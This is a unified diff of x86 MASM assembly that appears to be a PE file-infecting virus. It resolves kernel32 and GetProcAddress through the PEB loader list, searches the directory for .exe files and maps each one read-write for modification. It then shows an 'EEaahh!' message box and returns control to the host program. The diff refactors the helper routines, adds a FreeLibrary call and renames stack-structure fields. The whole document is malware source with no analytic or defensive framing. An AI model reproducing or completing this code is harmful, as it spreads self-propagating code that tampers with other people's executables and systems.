@@ -17,7 +17,6 @@ option casemap:none
 
       includelib \masm32\lib\kernel32.lib
 
-.data
 .code
 
 data:
@@ -34,10 +33,127 @@ data:
 	UnmapViewOfFile_str     BYTE "UnmapViewOfFile",0
 	CloseHandle_str         BYTE "CloseHandle",0
 	LoadLibrary_str         BYTE "LoadLibraryA",0
+	FreeLibrary_str         BYTE "FreeLibrary",0
 	MessageBox_str          BYTE "MessageBoxA",0
-	User32_str              BYTE "User32.dll",0
+	User32_str              BYTE "User32",0
 	PopUpMessage            BYTE "EEaahh!",0
 	returnAddr              DWORD 000000000h
+
+; ret : function address
+; arg1: function name
+; arg2: STACK_STORAGE struct
+GetProcAddr:
+	pop eax ; ret
+	pop ecx ; arg1
+	pop edx ; arg2
+	push eax
+
+	push ecx
+	push (STACK_STORAGE PTR [edx]).GetProcAddress_module
+	call (STACK_STORAGE PTR [edx]).GetProcAddress_addr
+	pop edx
+	jmp edx
+
+; ret : none
+; arg1: file size
+; arg2: STACK_STORAGE struct
+MapFileToRAM:
+	; use of offsets on esp, because the arguments
+	; and return address are on the stack
+	push [esp + (sizeof DWORD * 2)]
+	lea eax, [ebx + (CreateFileMapping_str - data)]
+	push eax
+	call GetProcAddr
+	;
+	mov edx, [esp + (sizeof DWORD * 2)]
+	mov edx, (STACK_STORAGE PTR [edx]).fileHandle
+	mov ecx, [esp + (sizeof DWORD * 1)]
+	push NULL
+	push ecx
+	push 0
+	push PAGE_READWRITE
+	push NULL
+	push edx
+	call eax ; CreateFileMapping()
+	mov edx, [esp + (sizeof DWORD * 2)]
+	mov (STACK_STORAGE PTR [edx]).fileMappingHandle, eax
+
+	push [esp + (sizeof DWORD * 2)]
+	lea eax, [ebx + (MapViewOfFile_str - data)]
+	push eax
+	call GetProcAddr
+	;
+	mov edx, [esp + (sizeof DWORD * 2)]
+	mov edx, (STACK_STORAGE PTR [edx]).fileMappingHandle
+	push 0
+	push 0
+	push 0
+	push (FILE_MAP_WRITE or FILE_MAP_READ)
+	push edx
+	call eax ; MapViewOfFile()
+	mov edx, [esp + (sizeof DWORD * 2)]
+	mov (STACK_STORAGE PTR [edx]).fileView, eax
+	;
+	pop edx
+	pop ecx
+	pop ecx
+	jmp edx
+
+; ret : none
+; arg1: STACK_STORAGE struct
+UnmapFileFromRAM:
+	push [esp + (sizeof DWORD * 1)]
+	lea eax, [ebx + (UnmapViewOfFile_str - data)]
+	push eax
+	call GetProcAddr
+	;
+	mov edx, [esp + (sizeof DWORD * 1)]
+	push (STACK_STORAGE PTR [edx]).fileView
+	call eax ; UnmapViewOfFile()
+
+	push [esp + (sizeof DWORD * 1)]
+	lea eax, [ebx + (CloseHandle_str - data)]
+	push eax
+	call GetProcAddr
+	;
+	mov edx, [esp + (sizeof DWORD * 1)]
+	push (STACK_STORAGE PTR [edx]).fileMappingHandle
+	call eax ; CloseHandle()
+	;
+	pop edx
+	pop ecx
+	jmp edx
+
+; ret : bool
+; arg1: string1
+; arg2: string2
+; arg3: length
+lstrncmp:
+	xor esi, esi ; string offset
+	xor eax, eax
+lstrncmp_loop:
+	cmp esi, [esp + (sizeof DWORD * 3)]
+	je lstrncmp_end_equal
+	mov ecx, [esp + (sizeof DWORD * 1)]
+	mov cl, [ecx + esi]
+	mov edx, [esp + (sizeof DWORD * 2)]
+	mov dl, [edx + esi]
+	cmp cl, dl
+	jne lstrncmp_end_not_equal
+	inc esi
+	jmp lstrncmp_loop
+lstrncmp_end_equal:
+	mov al, 1
+	jmp lstrncmp_end
+lstrncmp_end_not_equal:
+	mov al, 0
+lstrncmp_end:
+	pop edx
+	pop ecx
+	pop ecx
+	pop ecx
+	jmp edx
+
 
 start:
 	call get_eip ; get the injected .exe's environment instruction pointer
@@ -60,7 +176,7 @@ get_eip:
 
 	; loop through the linked list until we match with "KERNEL32.DLL"
 	; partial case insensitive check : length=12; name[0]=K; name[5]=L; name[6]=3; name[7]=2
-	; enough because KERNEL32 should always be before some other DLLs matching this pattern
+	; enough because KERNEL32 should always be before some other DLL matching this pattern
 loop_find_kernel32:
 	; ->FullDllName / get the UNICODE_STRING struct
 	lea eax, (LDR_DATA_TABLE_ENTRY PTR [edx]).FullDllName
@@ -170,6 +286,8 @@ loop_find_gpa_end:
 	mov (STACK_STORAGE PTR [esp]).kernel32BaseAddr, edi
 	; set it as module for GetProcAddress
 	mov (STACK_STORAGE PTR [esp]).GetProcAddress_module, edi
+	; set actual struct size on stack
+	mov (STACK_STORAGE PTR [esp]).alignedSize, dx
 
 	push esp
 	lea eax, [ebx + (FindFirstFile_str - data)]
@@ -194,7 +312,7 @@ loop_find_file:
 	call GetProcAddr
 
 	; check file and put it on the stack if needed
-	lea edx, (STACK_STORAGE PTR [esp]).targetName
+	lea edx, (STACK_STORAGE PTR [esp]).fileName
 	lea ecx, (WIN32_FIND_DATA PTR (STACK_STORAGE PTR [esp]).fileStruct).cFileName
 	push NULL
 	push edx
@@ -208,11 +326,11 @@ loop_find_file:
 	push eax
 	call GetProcAddr
 	;
-	lea edx, (STACK_STORAGE PTR [esp]).targetName
+	lea edx, (STACK_STORAGE PTR [esp]).fileName
 	push edx
 	call eax
 	; get to the end of the name, expecting ".exe"
-	lea edx, (STACK_STORAGE PTR [esp]).targetName[eax - 4]
+	lea edx, (STACK_STORAGE PTR [esp]).fileName[eax - 4]
 	mov edx, [edx]
 	cmp edx, 'exe.' ; (little endian)
 	jne loop_find_file_continue
@@ -235,7 +353,7 @@ loop_find_file:
 	push eax
 	call GetProcAddr
 	;
-	lea edx, (STACK_STORAGE PTR [esp]).targetName
+	lea edx, (STACK_STORAGE PTR [esp]).fileName
 	push NULL
 	push FILE_ATTRIBUTE_NORMAL
 	push OPEN_EXISTING
@@ -412,14 +530,6 @@ loop_find_file_end:
 	push (STACK_STORAGE PTR [esp]).fileQueryHandle
 	call eax ; FindClose() / close its handle
 
-	; compute STACK_STORAGE actual size in memory (with DWORD alignment)
-	xor edx, edx
-	mov ax, sizeof STACK_STORAGE
-	mov cx, 4
-	div cx
-	add dx, sizeof STACK_STORAGE
-	mov dx, (STACK_STORAGE PTR [esp]).sizeWithAlignment
-
 	mov eax, [ebx + (returnAddr - data)]
 	cmp eax, 0
 	je end_of_code
@@ -447,133 +557,25 @@ loop_find_file_end:
 	push NULL
 	call eax ; MessageBox()
 
-	mov eax, (STACK_STORAGE PTR [esp]).kernel32BaseAddr
-	mov (STACK_STORAGE PTR [esp]).GetProcAddress_module, eax
+	; put User32 handle on the stack
+	mov edx, esp
+	push (STACK_STORAGE PTR [esp]).GetProcAddress_module
+	mov eax, (STACK_STORAGE PTR [edx]).kernel32BaseAddr
+	mov (STACK_STORAGE PTR [edx]).GetProcAddress_module, eax
 
+	push edx
+	lea eax, [ebx + (FreeLibrary_str - data)]
+	push eax
+	call GetProcAddr
 
+	call eax ; FreeLibrary() ; handle argument already on the stack
 
-	add sp, (STACK_STORAGE PTR [esp]).sizeWithAlignment ; "free" the stack
+	add sp, (STACK_STORAGE PTR [esp]).alignedSize ; "free" the stack
 	mov eax, [ebx + (returnAddr - data)]
 	jmp eax
 
-; ret : function address
-; arg1: function name
-; arg2: STACK_STORAGE struct
-GetProcAddr:
-	pop eax ; ret
-	pop ecx ; arg1
-	pop edx ; arg2
-	push eax
-
-	push ecx
-	push (STACK_STORAGE PTR [edx]).GetProcAddress_module
-	call (STACK_STORAGE PTR [edx]).GetProcAddress_addr
-	pop edx
-	jmp edx
-
-; ret : none
-; arg1: file size
-; arg2: STACK_STORAGE struct
-MapFileToRAM:
-	; use of offsets on esp, because the arguments
-	; and return address are on the stack
-	push [esp + (sizeof DWORD * 2)]
-	lea eax, [ebx + (CreateFileMapping_str - data)]
-	push eax
-	call GetProcAddr
-	;
-	mov edx, [esp + (sizeof DWORD * 2)]
-	mov edx, (STACK_STORAGE PTR [edx]).fileHandle
-	mov ecx, [esp + (sizeof DWORD * 1)]
-	push NULL
-	push ecx
-	push 0
-	push PAGE_READWRITE
-	push NULL
-	push edx
-	call eax ; CreateFileMapping()
-	mov edx, [esp + (sizeof DWORD * 2)]
-	mov (STACK_STORAGE PTR [edx]).fileMappingHandle, eax
-
-	push [esp + (sizeof DWORD * 2)]
-	lea eax, [ebx + (MapViewOfFile_str - data)]
-	push eax
-	call GetProcAddr
-	;
-	mov edx, [esp + (sizeof DWORD * 2)]
-	mov edx, (STACK_STORAGE PTR [edx]).fileMappingHandle
-	push 0
-	push 0
-	push 0
-	push (FILE_MAP_WRITE or FILE_MAP_READ)
-	push edx
-	call eax ; MapViewOfFile()
-	mov edx, [esp + (sizeof DWORD * 2)]
-	mov (STACK_STORAGE PTR [edx]).fileView, eax
-	;
-	pop edx
-	pop ecx
-	pop ecx
-	jmp edx
-
-; ret : none
-; arg1: STACK_STORAGE struct
-UnmapFileFromRAM:
-	push [esp + (sizeof DWORD * 1)]
-	lea eax, [ebx + (UnmapViewOfFile_str - data)]
-	push eax
-	call GetProcAddr
-	;
-	mov edx, [esp + (sizeof DWORD * 1)]
-	push (STACK_STORAGE PTR [edx]).fileView
-	call eax ; UnmapViewOfFile()
-
-	push [esp + (sizeof DWORD * 1)]
-	lea eax, [ebx + (CloseHandle_str - data)]
-	push eax
-	call GetProcAddr
-	;
-	mov edx, [esp + (sizeof DWORD * 1)]
-	push (STACK_STORAGE PTR [edx]).fileMappingHandle
-	call eax ; CloseHandle()
-	;
-	pop edx
-	pop ecx
-	jmp edx
-
-; ret : bool
-; arg1: string1
-; arg2: string2
-; arg3: length
-lstrncmp:
-	xor esi, esi ; string offset
-	xor eax, eax
-lstrncmp_loop:
-	cmp esi, [esp + (sizeof DWORD * 3)]
-	je lstrncmp_end_equal
-	mov ecx, [esp + (sizeof DWORD * 1)]
-	mov cl, [ecx + esi]
-	mov edx, [esp + (sizeof DWORD * 2)]
-	mov dl, [edx + esi]
-	cmp cl, dl
-	jne lstrncmp_end_not_equal
-	inc esi
-	jmp lstrncmp_loop
-lstrncmp_end_equal:
-	mov al, 1
-	jmp lstrncmp_end
-lstrncmp_end_not_equal:
-	mov al, 0
-lstrncmp_end:
-	pop edx
-	pop ecx
-	pop ecx
-	pop ecx
-	jmp edx
-
-
 end_of_code:
-	add sp, (STACK_STORAGE PTR [esp]).sizeWithAlignment ; "free" the stack
+	add sp, (STACK_STORAGE PTR [esp]).alignedSize ; "free" the stack
 	; hard-coded call, so kernel32 is loaded in the infector
 	push 0
 	call ExitProcess
